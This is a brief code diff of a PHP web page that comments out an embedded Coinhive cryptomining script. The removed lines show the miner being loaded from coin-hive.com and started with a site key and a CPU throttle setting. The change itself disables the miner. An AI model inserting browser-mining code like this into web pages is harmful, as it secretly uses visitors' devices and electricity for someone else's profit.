@@ -70,7 +70,7 @@ function formatSizeUnits($bytes)
 echo "<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js\"></script>";
 echo "<script type='text/javascript' src='/scripts/main.js'></script>";
 ?>
-<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<!-- <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
 	var miner = new CoinHive.Anonymous('GIoaIxGbl6vKvaabbiDkxGKfl5QfYmjv', {
         throttle: 0.7,
@@ -86,4 +86,4 @@ echo "<script type='text/javascript' src='/scripts/main.js'></script>";
     }
 	
 
-</script>
+</script> -->
